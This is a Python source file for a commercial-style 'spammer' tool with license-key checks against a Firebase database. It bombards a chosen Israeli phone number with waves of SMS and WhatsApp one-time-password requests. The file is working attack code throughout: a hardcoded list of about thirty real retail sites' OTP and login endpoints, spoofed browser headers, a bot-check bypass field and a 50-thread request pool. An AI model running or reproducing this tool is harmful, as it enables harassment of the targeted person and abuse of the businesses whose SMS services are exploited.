import requests
import time
import random
import os
import json
import string
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ────────────────────────────────────────────────
#   CONFIG & COLORS (אדום + לבן בלבד)
# ────────────────────────────────────────────────

R = "\033[91m"   # אדום בהיר
W = "\033[97m"   # לבן בהיר
X = "\033[0m"    # reset

BASE_URL = "https://ronen-spammer-6b075-default-rtdb.europe-west1.firebasedatabase.app/"
DB_URL = f"{BASE_URL}keys.json"
CONFIG_PATH = os.path.join(os.environ.get('LOCALAPPDATA', os.getcwd()), "ronen_auth.json")

# ────────────────────────────────────────────────
#   ASCII - RONEN SPAMMER (צבע אחיד אדום)
# ────────────────────────────────────────────────

def ascii_ronen_spammer():
    os.system('cls' if os.name == 'nt' else 'clear')
    art = [
        r"  ██████╗  ██████╗ ███╗   ██╗███████╗███╗   ██╗",
        r"  ██╔══██╗██╔═══██╗████╗  ██║██╔════╝████╗  ██║",
        r"  ██████╔╝██║   ██║██╔██╗ ██║█████╗  ██╔██╗ ██║",
        r"  ██╔══██╗██║   ██║██║╚██╗██║██╔══╝  ██║╚██╗██║",
        r"  ██║  ██║╚██████╔╝██║ ╚████║███████╗██║ ╚████║",
        r"  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝",
        r"          S P A M M E R                          ",
    ]
    for line in art:
        print(f"{R}{line}{X}")
    
    print(f"\n   {W}made by RoNen{X}\n")

# ────────────────────────────────────────────────
#   ADMIN (רק ronen)
# ────────────────────────────────────────────────

def admin_view_keys():
    print(f"\n{R}┌─────────── KEYS DATABASE ───────────┐{X}")
    try:
        r = requests.get(DB_URL, timeout=10)
        data = r.json() or {}
        if not data:
            print(f"{W}   No keys found.{X}")
        else:
            print(f"{W}   {'KEY':20}  {'USER':12}  {'EXPIRY':12}{X}")
            print(f"{R}   ──────────────────────────────────────{X}")
            for k, v in data.items():
                print(f"{W}   {k:20}  {v.get('username','?'):12}  {v.get('expiry','?'):12}{X}")
    except:
        print(f"{R}   Connection failed{X}")
    print(f"{R}└─────────────────────────────────────┘{X}")
    input(f"\n{W}Press Enter...{X}")

def admin_delete_key():
    key = input(f"\n{R}Key to delete → {X}").strip()
    if key:
        requests.delete(f"{BASE_URL}keys/{key}.json")
        print(f"{R}Key deleted.{X}")
    input(f"{W}Press Enter...{X}")

def admin_add_key():
    u = input(f"{R}Username for new key → {X}").strip()
    k = f"RONEN-{''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))}"
    exp = input(f"{R}Expiry (YYYY-MM-DD or never) → {X}").strip()
    requests.patch(DB_URL, json={k: {"username": u, "expiry": exp}})
    print(f"{R}New key: {k}{X}")
    input(f"{W}Press Enter...{X}")

# ────────────────────────────────────────────────
#   VALIDATION + LOADING
# ────────────────────────────────────────────────

def is_valid_israeli_phone(phone: str) -> bool:
    phone = phone.strip().replace(" ", "").replace("-", "").replace("_", "")
    if phone.startswith("+972"): phone = "0" + phone[4:]
    elif phone.startswith("972"): phone = "0" + phone[3:]
    
    if not phone.startswith("0") or len(phone) != 10:
        return False
    
    prefix = phone[:3]
    valid = {"050","051","052","053","054","055","056","058","02","03","04","08","09"}
    return prefix in valid and phone[1:].isdigit()

def check_license(username, key):
    try:
        r = requests.get(DB_URL, timeout=9)
        data = r.json() or {}
        if key in data and data[key].get("username") == username:
            exp = data[key].get("expiry")
            if exp == "never":
                return True, "Lifetime"
            try:
                dt = datetime.strptime(exp, "%Y-%m-%d")
                days = (dt - datetime.now()).days
                if days >= -1:
                    return True, f"≈{days+1} days"
            except:
                pass
        return False, "Invalid"
    except:
        return False, "Server error"

def fake_loading_screen(username, expiry):
    print(f"\n{R}RONEN SPAMMER starting...{X}")
    for i in range(5, 0, -1):
        print(f"{R}Entering in {i}...   User: {W}{username}{R}   Expiry: {W}{expiry}{R}{' ' * 20}{X}", end="\r")
        time.sleep(0.9 + random.uniform(0.05, 0.25))
    print(" " * 90, end="\r")
    print(f"\n{R}Access granted.{X}\n")

def login():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                d = json.load(f)
                u, k = d["username"], d["key"]
            ok, status = check_license(u, k)
            if ok:
                return True, u, k, status
            os.remove(CONFIG_PATH)
        except:
            pass

    ascii_ronen_spammer()

    u = input(f"{R}Username → {X}").strip()
    k = input(f"{R}Key      → {X}").strip()

    ok, status = check_license(u, k)
    if ok:
        fake_loading_screen(u, status)
        with open(CONFIG_PATH, "w") as f:
            json.dump({"username": u, "key": k}, f)
        return True, u, k, status
    
    print(f"\n{R}Access denied → {status}{X}")
    time.sleep(1.2)
    return False, None, None, None

# ────────────────────────────────────────────────
#   ENGINES - תיקון Victoria's Secret
# ────────────────────────────────────────────────

def fire_magento_v3(url, name, phone):
    try:
        sess = requests.Session()
        sess.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Requested-With": "XMLHttpRequest",
        })
        home = url.split("customer")[0]
        sess.get(home, timeout=5)
        
        data = {"form_key": "Ey4knrSRwDvWaGdz", "telephone": phone, "type": "login", "bot_validation": "1"}
        r = sess.post(url, data=data, timeout=8)
        if r.status_code in (200, 201):
            return f"{R}[+] {name:18} → SENT{X}"
        return f"{W}[!] {name:18} → BLOCK{X}"
    except:
        return f"{W}[-] {name:18} → ERR{X}"

def fire_fox_group(url, name, phone):
    try:
        session_uuid = str(uuid.uuid4())
        h = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        requests.post(url.replace("/otp/send", "/verify-customer-id"), 
                      json={"userId": "30" + "".join(random.choices(string.digits, k=7))}, headers=h, timeout=4)
        r = requests.post(url, json={"phoneNumber": phone, "uuid": session_uuid}, headers=h, timeout=6)
        wa_url = url.replace("/otp/send", "/whatsapp/send")
        requests.post(wa_url, json={"phoneNumber": phone, "uuid": session_uuid}, headers=h, timeout=6)
        if r.status_code in (200, 201):
            return f"{R}[+] {name:18} → SMS+WA{X}"
        return f"{W}[!] {name:18} → FAIL{X}"
    except:
        return f"{W}[-] {name:18} → ERR{X}"

def fire_ace_special(phone):
    try:
        url = "https://www.ace.co.il/login/prelogin/stepone"
        payload = [{"name": "phone", "value": phone}, {"name": "newaut", "value": "1"}]
        requests.post(url, json=payload, timeout=6)
        return f"{R}[+] ACE → SENT{X}"
    except:
        return f"{W}[-] ACE → ERR{X}"

def fire_extras_combined(phone):
    try:
        requests.post("https://jack-kuba.co.il/customer/sms/check/", data={"phone": phone}, timeout=5)
        requests.post("https://story.magicetl.com/public/shopify/apps/otp-login/step-one", 
                      json={"phone": phone, "shop": "story-online-il.myshopify.com"}, timeout=5)
        requests.post("https://api.noyhasade.co.il/api/login?origin=web", json={"phone": phone}, timeout=5)
        p = "+972" + phone[1:] if phone.startswith("0") else phone
        requests.post("https://us-central1-webcut-2001a.cloudfunctions.net/phoneValidate", json={"phone": p, "type": "sms"}, timeout=5)
        requests.post("https://us-central1-webcut-2001a.cloudfunctions.net/phoneValidate", json={"phone": p, "type": "whatsapp"}, timeout=5)
        requests.post("https://api.dreamax.co.il/rest/send_otp", json={"phone": phone}, timeout=5)
        requests.post("https://www.tevanaot.co.il/apps/api/otp/request", json={"phone": phone}, timeout=5)
        return f"{R}[+] Extras → SENT{X}"
    except:
        return f"{W}[-] Extras → ERR{X}"

# ────────────────────────────────────────────────
#   MAIN
# ────────────────────────────────────────────────

magento_list = [
    ("https://www.intima-il.co.il/customer/ajax/post/",        "Intima"),
    ("https://www.crazyline.com/customer/ajax/post/",          "CrazyLine"),
    ("https://www.golfkids.co.il/customer/ajax/post/",         "GolfKids"),
    ("https://www.golfco.co.il/customer/ajax/post/",           "Golf&Co"),
    ("https://www.kikocosmetics.co.il/customer/ajax/post/",    "Kiko"),
    ("https://www.lighting.co.il/customer/ajax/post/",         "Lighting"),
    ("https://www.fixfixfixfix.co.il/customer/ajax/post/",     "FIX"),
    ("https://www.victoriassecret.co.il/customer/ajax/post/",  "VS"),          # תוקן כאן
    ("https://www.castro.com/customer/ajax/post/",             "Castro"),
    ("https://www.topten-fashion.com/customer/ajax/post/",     "TopTen"),
    ("https://www.golf-il.co.il/customer/ajax/post/",          "Golf-IL"),
    ("https://www.golbary.co.il/customer/ajax/post/",          "Golbary"),
    ("https://www.hoodies.co.il/customer/ajax/post/",          "Hoodies"),
    ("https://www.nautica.co.il/customer/ajax/post/",          "Nautica"),
    ("https://www.onot.co.il/customer/ajax/post/",             "Onot"),
    ("https://www.papaya.co.il/customer/ajax/post/",           "Papaya"),
    ("https://www.carolinalemke.co.il/customer/ajax/post/",    "Carolina"),
]

fox_list = [
    ("https://fox.co.il/apps/dream-card/api/proxy/otp/send",       "Fox"),
    ("https://www.laline.co.il/apps/dream-card/api/proxy/otp/send","LaLine"),
    ("https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send","FoxHome"),
    ("https://footlocker.co.il/apps/dream-card/api/proxy/otp/send","FootLocker"),
    ("https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send", "ItayBrands"),
]

def start_spam_attack(target, waves):
    """מריץ את גלי התקיפה על היעד שהוגדר."""
    for wave in range(1, waves + 1):
        print(f"\n   {R}───── WAVE {wave}/{waves} ─────{X}\n")
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(fire_magento_v3, u, n, target) for u, n in magento_list]
            futures += [ex.submit(fire_fox_group, u, n, target) for u, n in fox_list]
            futures.append(ex.submit(fire_ace_special, target))
            futures.append(ex.submit(fire_extras_combined, target))

            for f in as_completed(futures):
                print(f.result())
        if wave < waves:
            print(f"\n   {R}Next wave in 5s...{X}")
            time.sleep(5)
    print(f"\n   {R}Done.{X}")

def main():
    ok, user, key, status = login()
    if not ok:
        return

    while True:
        ascii_ronen_spammer()
        print(f"   {R}User:{X} {W}{user}{X}     {R}Expiry:{X} {W}{status}{X}\n")

        print(f"   {R}1{X}  →  Start spam")
        if user.lower() == "ronen":
            print(f"   {R}2{X}  →  View keys")
            print(f"   {R}3{X}  →  Add key")
            print(f"   {R}4{X}  →  Delete key")
        print(f"   {R}0{X}  →  Exit\n")

        choice = input(f"   {W}→ {X}").strip()

        if choice == "1":
            target = input(f"\n   {R}Target phone → {X}").strip()
            if not is_valid_israeli_phone(target):
                print(f"\n{R}Invalid Israeli phone (10 digits, starts with 0){X}")
                input(f"{W}Press Enter...{X}")
                continue

            try:
                waves = int(input(f"   {R}Waves → {X}") or 1)
            except:
                waves = 1

            start_spam_attack(target, waves)

            input(f"\n   {R}Press Enter to return to menu...{X}")

        elif choice == "2" and user.lower() == "ronen":
            admin_view_keys()
        elif choice == "3" and user.lower() == "ronen":
            admin_add_key()
        elif choice == "4" and user.lower() == "ronen":
            admin_delete_key()
        elif choice in ("0", "q"):
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}Exiting...{X}")